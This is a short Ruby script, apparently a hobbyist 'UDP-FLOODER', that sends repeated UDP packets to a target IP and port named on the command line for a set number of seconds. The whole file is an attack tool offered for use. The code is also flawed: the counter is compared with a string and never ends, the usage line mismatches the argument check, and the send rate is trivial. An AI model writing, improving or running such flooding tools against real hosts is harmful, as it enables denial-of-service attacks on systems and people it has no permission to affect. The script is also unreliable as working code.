require 'socket'
require 'open-uri'
require 'colorize'

class Design

  def Ascii
    req = open("http://artii.herokuapp.com/make?text=UDP-FLOODER&font=trek").read
    return req.red
  end

  def Copy
    puts "Dev By Muham'RB".white
    puts "Script: UDP-FLOODER".white
    puts "Description: ".white
    puts "This script send mass request udp".white
    self.Help
  end

  def Help
    puts "Usage: #{__FILE__} ip port time method".green
  end

  def Credits
    puts "#{"-"*10}[ #{"Credits".white} ]#{"-"*10}".blue
    puts "Developper: ".blue
    puts "  Muham'RB".white
    puts "Designer: ".blue
    puts "  Muham'RB".white
    puts "Idea: ".blue
    puts "  Unamed".white
    puts "#{"-"*31}".blue
  end

end


class UDP

  def Attack
    s = UDPSocket.new
    s.connect(@ip, @port)
    s.send("Copyright UDP-FLOODER", 0)

  end

  def StopAttack
    exit
  end

  def Start(ip, port, timer)

    @ip = ip
    @port = port
    @timer = timer

    count = 0
    puts "attack started: #{@ip} : #{@port} pending #{@timer} seconds".green
    while count != @timer
      sleep(1)
      self.Attack
      count += 1
    end
    puts "Attack finish !! :)".blue
    self.StopAttack


  end

end

design = Design.new
puts design.Ascii
design.Copy

attack = UDP.new
if ARGV.length == 3
  attack.Start(ARGV[0], ARGV[1], ARGV[2])
else
  design.Help
end
